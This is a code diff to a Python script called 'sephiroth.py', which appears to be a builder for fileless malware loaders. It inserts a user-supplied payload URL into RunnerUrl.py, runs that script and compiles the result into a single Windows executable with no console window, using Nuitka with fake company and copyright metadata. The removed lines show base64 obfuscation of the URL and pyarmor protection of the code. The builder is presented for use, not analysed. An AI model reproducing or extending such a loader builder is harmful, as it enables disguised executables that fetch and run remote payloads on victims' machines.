@@ -6,55 +6,52 @@ import random
 from colorama import Fore, Style
 import subprocess
 import sys
-import base64
+
 import platform
 def display_ansi_art(file_path):
     with open(file_path, 'r', encoding='latin-1') as file:
         ansi_art = file.read()
     print(ansi_art)
-# Function to obfuscate the URL using base64 encoding
+
 def create_exe(py_file):
     try:
-        try:
-            subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
-        except subprocess.CalledProcessError as e:
-            print(f"Error in subprocess: {e}")
+        
 
         try:
-            subprocess.run(["pyarmor", "g", f"{py_file}"])
-        except subprocess.CalledProcessError as e:
-            print(f"Error in subprocess: {e}")
-
-        try:
-            py_file = f'./dist/{py_file}' if os.path.exists(f'./dist/{py_file}') else f'./{py_file}'
             
             
-            
+            is_windows = platform.system().lower() == "windows"
+            python_executable = "python" if is_windows else "python3"
             if platform.system().lower() != "windows":
-                raise Exception("You need to compile in a Windows environment use -Pl to specify target Platforme .")
-            pyinstaller_command = [
-                "pyinstaller",
-                "--noconfirm",
+                raise Exception("You need to compile in a Windows environment .")
+            nuitka_command = [
+                python_executable, "-m", "nuitka",
                 "--onefile",
-                "--windowed",
-                "--name", "Sephiroth",
-                "--add-binary", "./dist/pyarmor_runtime_000000/pyarmor_runtime.pyd;.",
-                "--hidden-import", "ctypes",
-                "--hidden-import", "requests",
-                "--clean",
+                "--company-name=Sephiroth",
+                "--file-version=1.2",
+                "--copyright=COPYRIGHT@Sephiroth",
+                "--trademarks=No Enemies",
+                
+                "--disable-console",
+                "--standalone",
+                "--remove-output",
+                f"--output-dir=Output",
+                f"--output-filename=Sephiroth",
+                
                 py_file
             ]
-            subprocess.run(pyinstaller_command)
+           
+            
+            
+            subprocess.run(nuitka_command)
         except subprocess.CalledProcessError as e:
-            print(f"Error in subprocess: {e}")
+                print(f"Error in subprocess: {e}")
 
 
         print("windows Executable creation process completed.")
     except Exception as e:
         print(f"An error occurred: {e}")
-def obfuscate_url(url):
-    encoded_url = base64.b64encode(url.encode()).decode()
-    return encoded_url
+
 def main():
     colorama.init(autoreset=True)  # Initialize colorama for Windows
     ans_directory = 'banners'
@@ -97,7 +94,7 @@ def main():
             new_url = args.Fileless
 
             # Obfuscate the new URL
-            obfuscated_url = obfuscate_url(new_url)
+            obfuscated_url = new_url
 
             # Read the content of RunnerUrl.py and update the URL
             with open('RunnerUrl.py', 'r') as file:
@@ -113,13 +110,15 @@ def main():
                         parts[1] = obfuscated_url  # Update the URL with the obfuscated value
                         line = '"'.join(parts)
                 updated_lines.append(line)
+            
 
             # Write the updated content back to RunnerUrl.py
             updated_content = '\n'.join(updated_lines)
             with open('RunnerUrl.py', 'w') as file:
                 file.write(updated_content)
             print("initiation phase done")
-            create_exe("RunnerUrl.py")
+            subprocess.run("python RunnerUrl.py ")
+            create_exe("exec.py")
         else:
             print("Bad Url")
             print("\nUsage: python sephiroth.py -url <url>")
